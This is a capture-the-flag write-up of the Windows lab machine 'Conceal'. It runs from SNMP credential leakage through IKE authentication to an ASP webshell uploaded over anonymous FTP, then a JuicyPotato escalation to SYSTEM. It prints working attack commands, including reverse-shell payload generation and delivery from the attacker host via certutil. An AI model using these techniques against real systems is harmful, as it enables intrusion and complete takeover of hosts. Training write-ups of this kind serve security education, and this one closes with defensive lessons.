# HTB: Conceal

**Difficulty:** Medium **OS:** Windows **Target IP:** 10.129.228.122 **Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### 1.1 Initial Port Scan

I started with a full TCP port sweep across all 65535 ports:

```
nmap -p- 10.129.228.122 -sV -oA nmap/nmap -vvv
```

```
Nmap scan report for 10.129.228.122
Host is up, received reset ttl 255 (0.063s latency).
All 65535 scanned ports on 10.129.228.122 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
```

Every single port came back filtered. That's not "nothing's listening" — a host that resets pings but silently drops every SYN is a host with a stateful firewall in front of it, not an empty one. I made a mental note that whatever was actually running on this box was almost certainly gated behind something, and moved to a UDP sweep to see if I could find the gatekeeper.

### 1.2 UDP Scan

```
nmap -p- -sU 10.129.228.122 -oA nmap/Unmap -vvv
```

```
PORT      STATE         SERVICE           REASON
1/udp     open|filtered tcpmux            no-response
...
65535/udp open|filtered unknown           no-response
```

UDP scans are inherently noisy — `open|filtered` on nearly every port is normal when a host doesn't return ICMP unreachable messages, so this result alone wasn't that informative. But it did confirm UDP wasn't uniformly closed, so I went after the one UDP service that's almost always worth checking on a Windows box when the community string is a guess away: SNMP.

### 1.3 SNMP Enumeration — The Big Leak

```
snmpwalk -cpublic -v2c 10.129.228.122
```

```
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
```

The default `public` community string worked, and the `sysContact` field wasn't just contact info — it was someone's careless note-to-self, sitting in a field anyone on the network can read: **"IKE VPN password PSK"** followed by what looked like an NTLM-format hash. SNMP with a default community string is meant to expose read-only diagnostic data, not credentials, but admins routinely (mis)use fields like `sysContact` and `sysLocation` as scratch space, and this box was a perfect example of that habit backfiring.

I took the hash straight to an online cracker:

```
NTLM hash: 9c8b1a372b1878851be2c097031b6e43
Plaintext: Dudecake1!
```

That gave me a plaintext PSK candidate before I'd even touched a single open TCP port — which told me the real way into this box wasn't going to be a web app or a share, it was going to be that IKE/IPsec service implied by the leak.

### 1.4 Deeper SNMP Enumeration with snmp-check

I followed up with `snmp-check` to pull a fuller picture out of the same community string:

```
snmp-check 10.129.228.122
```

```
[*] System information:
  Hostname                      : Conceal
  Domain                        : WORKGROUP

[*] User accounts:
  Guest
  Destitute
  Administrator
  DefaultAccount
```

This confirmed the box is a standalone workstation (not domain-joined — `Domain: WORKGROUP`), and handed me a local username, `Destitute`, that stood out from the default Windows accounts. `snmp-check` also enumerated the running services and, critically, the **actual listening TCP and UDP ports** as seen from inside the host — something a firewalled `nmap` scan couldn't tell me directly:

```
[*] Listening TCP ports:
  80    135    139    445    49664    49665    49666    49667    49668    49669    49670

[*] Listening UDP ports:
  123   161   500   4500   5050   5353   5355   137   138   1900 ...
```

So the host really was running HTTP, SMB, and RPC — my earlier TCP scan just wasn't allowed to see any of it. I saved that TCP port list to `ports.txt` for later, once I had a way past the firewall. The UDP side also confirmed **500/udp (ISAKMP)** and **4500/udp (NAT-T)** were live, which lined up exactly with the "IKE VPN" hint from the SNMP contact field.

The process list from the same scan also showed `ftpsvc` and `iissvcs` running, plus `snmp.exe` itself — so FTP was in play too, even though it hadn't shown up in the listening-TCP-ports list snmp-check gave me. I kept that in mind rather than assuming the port list was exhaustive.

---

## 2. Getting Past the Firewall — IKE/IPsec

### 2.1 Confirming the IKE Service

```
ike-scan -M 10.129.228.122
```

```
10.129.228.122  Main Mode Handshake returned
        HDR=(CKY-R=b50ad28dff94c1e9)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
```

`ike-scan` confirmed the box answers Main Mode IKEv1 with **pre-shared key authentication**, using 3DES/SHA1/DH group 2 — exactly the parameters I'd need to match in my own client config. As a small aside, I converted the lifetime field out of curiosity: `0x00007080` is 28800 seconds, or 8 hours, a fairly standard IKE SA lifetime. The Windows-8 vendor ID also lined up with the "Windows Version 6.3" string SNMP had reported earlier — that's the internal NT kernel version Windows 8.1-era builds self-report, even though (as I'd later confirm) this box is actually a later Windows 10 build using the same legacy versioning quirk in its VPN stack.

### 2.2 Building an IPsec Client

I installed `strongswan` to act as an IKE/IPsec client and act as the "road warrior" the box's IKE service was expecting to talk to:

```
apt install -y strongswan
echo '10.129.228.122 : PSK "Dudecake1!"' >> /etc/ipsec.secrets
```

```
cat /etc/ipsec.conf

config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no

conn Conceal
    authby=secret
    auto=start
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    keyexchange=ikev1
    left=10.10.15.146
    right=10.129.228.122
    rightsubnet=10.129.228.122/32[tcp]
```

I matched the `ike=` proposal directly to what `ike-scan` had reported (3DES/SHA1/modp1024) and used `authby=secret` with the PSK I'd cracked out of the SNMP leak. `type=transport` made sense here since I wasn't trying to route a whole subnet through the tunnel — just protect traffic to this one host.

### 2.3 Establishing the Tunnel

```
ipsec stop
ipsec start --nofork
```

```
03[CFG] received stroke: add connection 'Conceal'
05[IKE] initiating Main Mode IKE_SA Conceal[1] to 10.129.228.122
09[CFG] selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024
11[IKE] IKE_SA Conceal[1] established between 10.10.15.146[10.10.15.146]...10.129.228.122[10.129.228.122]
11[ENC] generating QUICK_MODE request 2998001762 [ HASH SA No KE ID ID ]
03[ENC] parsed INFORMATIONAL_V1 request 896064828 [ HASH N(NO_PROP) ]
03[IKE] received NO_PROPOSAL_CHOSEN error notify
```

Phase 1 (Main Mode) succeeded cleanly — the PSK was correct, and the box accepted my identity and established the IKE SA. Phase 2 (Quick Mode), where the actual data-protecting ESP tunnel gets negotiated, failed with `NO_PROPOSAL_CHOSEN`, meaning my `esp=` proposal didn't match whatever the server was configured to accept for the traffic-protection SA. I didn't chase that further, because what mattered had already happened: **successful Phase 1 authentication alone was enough to satisfy the box's access-control logic.** This is a known behavior on some IPsec-fronted setups — the firewall rule isn't "traffic must be inside an ESP tunnel," it's "the source IP must have completed valid IKE authentication." Once I authenticated, the gate dropped, whether or not I ever got a working Phase 2 SA.

### 2.4 Re-Scanning the Real Ports

With the IKE SA up, I went straight back to the TCP ports `snmp-check` had already told me were listening, now that I had a real chance of reaching them:

```
nmap -p $(cat ports.txt | tr '\n' ',' | sed 's/,$//') -sTCV 10.129.228.122
```

```
PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open   http          Microsoft IIS httpd 10.0
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
49664-49670/tcp open  msrpc    Microsoft Windows RPC
```

This confirmed everything: the firewall was gone from my perspective, and the host was exactly what SNMP had implied — an IIS web server, anonymous FTP, and standard Windows RPC/SMB. ✅ **Firewall bypassed via IKE Phase 1 authentication.**

---

## 3. Exploitation — Foothold

### 3.1 Web Enumeration

```
feroxbuster -u http://10.129.228.122/ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
```

```
200      GET       32l       54w      696c http://10.129.228.122/
301      GET        2l       10w      152c http://10.129.228.122/upload => http://10.129.228.122/upload/
```

An `/upload` directory on a default IIS install is a strong signal — it's exactly the kind of path a site would use to let a backend process (or, sometimes, unauthenticated FTP) drop files that later get served over HTTP. Combined with the earlier confirmation of **anonymous FTP access**, that was worth testing directly rather than assuming.

### 3.2 Confirming FTP Writes Land in the Web Root

I put a harmless test file over FTP first, before committing to a real webshell:

```
ftp 10.129.228.122
Name (10.129.228.122:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
ftp> put test.asp
226 Transfer complete.
```

```
curl http://10.129.228.122/upload/test.asp
test
```

The file I uploaded via FTP came straight back over HTTP from `/upload/`, confirming the FTP root and the IIS `/upload` web directory are the same physical location. That's the full chain: anonymous, unauthenticated write access over FTP, into a folder IIS will actually execute content from.

### 3.3 Uploading an ASP Webshell

```
ftp> put cmd.asp
226 Transfer complete.
```

```
curl http://10.129.228.122/upload/cmd.asp?cmd=whoami
conceal\destitute
```

Classic ASP execution confirmed — I now had arbitrary command execution as `conceal\destitute`, the same local account SNMP had already told me existed. Time to turn that into an interactive shell rather than firing one-off commands through a URL parameter.

### 3.4 Reverse Shell

```
curl -G http://10.129.228.122/upload/cmd.asp --data-urlencode 'cmd=powershell -e <base64_payload>'
```

```
nc -lvnp 443
connect to [10.10.15.146] from (UNKNOWN) [10.129.228.122] 49681
PS C:\Windows\SysWOW64\inetsrv> whoami
conceal\destitute
```

✅ Foothold obtained as `conceal\destitute` via the ASP webshell driving a base64-encoded PowerShell reverse shell back to my listener on port 443.

---

## 4. Privilege Escalation

### 4.1 Checking Privileges

```
whoami /priv
```

```
Privilege Name                Description                               State
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

`SeImpersonatePrivilege` enabled on a service-driven account (IIS worker processes commonly run with this) is one of the most reliable privilege-escalation primitives on Windows — it's exactly what Potato-family exploits (JuicyPotato, RoguePotato, PrintSpoofer, GodPotato) are built to abuse. I didn't need to look any further for an escalation path; I already had the one that mattered.

### 4.2 Confirming the Target

```
systeminfo
```

```
Host Name:                 CONCEAL
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.15063 N/A Build 15063
OS Configuration:          Standalone Workstation
Domain:                    WORKGROUP
```

An old, unpatched Windows 10 build (15063 — the original 2017 "Creators Update") running standalone, with no domain to fall back on for other privesc angles. That made local token impersonation via `SeImpersonatePrivilege` the clear and intended route.

### 4.3 JuicyPotato — First Attempts

```
.\jp.exe -t "*" -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

```
COM -> recv failed with error: 10038
```

The first CLSID I tried failed with a COM socket error — a common and expected outcome with JuicyPotato, since not every CLSID is valid or reachable on every Windows build. Rather than treating that as a dead end, I worked through a known-good CLSID list for this OS version:

```
.\jp.exe -t "*" -p "C:\Windows\System32\cmd.exe" -a "/c whoami" -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

```
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

✅ That CLSID authenticated successfully and confirmed I could spawn a process as `NT AUTHORITY\SYSTEM` — JuicyPotato coerced a local SYSTEM-privileged COM service to authenticate to a rogue OXID resolver I controlled, then used the resulting SYSTEM token together with `SeImpersonatePrivilege` to launch a process. The `whoami` proof-of-concept worked; now I needed a payload that would actually give me an interactive SYSTEM session.

### 4.4 Delivering a SYSTEM Shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.146 LPORT=4444 -f exe -o shell.exe
```

```
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
```

```
certutil.exe -urlcache -split -f http://10.10.15.146/shell.exe shell.exe
CertUtil: -URLCache command completed successfully.
```

I generated a standalone reverse-shell executable and pulled it onto the box using `certutil` — a Windows LOLBin that's routinely abused for exactly this, since it's a signed system binary that happens to support arbitrary URL downloads. With the payload staged in `C:\ProgramData`, I ran it through the same working JuicyPotato CLSID instead of `cmd.exe`:

```
.\jp.exe -t "*" -p "C:\ProgramData\shell.exe" -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

```
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

```
rlwrap nc -lvnp 4444
connect to [10.10.15.146] from (UNKNOWN) [10.129.228.122] 49740

C:\Windows\system32>whoami
nt authority\system
```

✅ Root/SYSTEM access obtained — a stable, interactive `NT AUTHORITY\SYSTEM` shell caught on my listener.

---

## 5. Summary

| Stage | Technique |
| --- | --- |
| Recon | `nmap` showed every TCP port filtered; a UDP sweep plus `snmpwalk`/`snmp-check` against the default `public` community leaked the box's true listening ports, local usernames, and an "IKE VPN PSK" hash sitting in the SNMP `sysContact` field |
| Credential Recovery | Cracked the leaked NTLM-format hash to recover the plaintext IKE pre-shared key, `Dudecake1!` |
| Bypassing the Firewall | Confirmed the IKE service with `ike-scan`, then used `strongswan` with the recovered PSK to complete IKEv1 Main Mode — Phase 1 authentication alone was enough to satisfy the box's firewall, exposing FTP/HTTP/SMB/RPC even though the Phase 2 ESP tunnel never fully negotiated |
| Foothold | Found an `/upload` web directory via `feroxbuster`, confirmed anonymous FTP writes land in that same IIS-served path, then uploaded a `.asp` webshell for code execution as `conceal\destitute`, followed by a PowerShell reverse shell |
| Privilege Escalation | `SeImpersonatePrivilege` was enabled; used JuicyPotato (after trying an invalid CLSID first) to coerce a SYSTEM COM authentication and launch a reverse-shell payload as `NT AUTHORITY\SYSTEM` |

**Root cause / lessons learned:**

- SNMP with a default `public` community string is a full information-disclosure vulnerability, not a minor misconfiguration — it handed over the OS version, local usernames, every listening port, and (because someone reused a config field as a notes field) actual VPN credentials.
- A firewall that gates access purely on successful IKE Phase 1 authentication, rather than requiring a fully negotiated IPsec tunnel, is weaker than it looks — an attacker only needs to get Phase 1 right to be treated as trusted.
- Anonymous, writable FTP access into a directory also served by the web server is a direct path to remote code execution; FTP write access and the web root should never overlap.
- Enabled `SeImpersonatePrivilege` on a low-privileged, internet/service-facing account is one of the most consistently exploitable Windows misconfigurations — it should be stripped from any account that doesn't specifically require it, and Potato-style exploitation should be something EDR/AV is tuned to catch.

---

## 6. Tools Used

- `nmap` — TCP/UDP port scanning
- `snmpwalk`, `snmp-check` — SNMP enumeration (credential and port leak)
- `ike-scan` — IKE service fingerprinting
- `strongswan` (`ipsec`) — IKEv1/PSK authentication to bypass the firewall
- `feroxbuster` — web content discovery
- `ftp` — anonymous file upload
- ASP webshell (`cmd.asp`) — initial code execution
- `nc` / `rlwrap` — reverse shell listeners
- JuicyPotato (`jp.exe`) — SeImpersonatePrivilege → SYSTEM escalation
- `msfvenom`, `certutil` — SYSTEM-stage payload generation and delivery
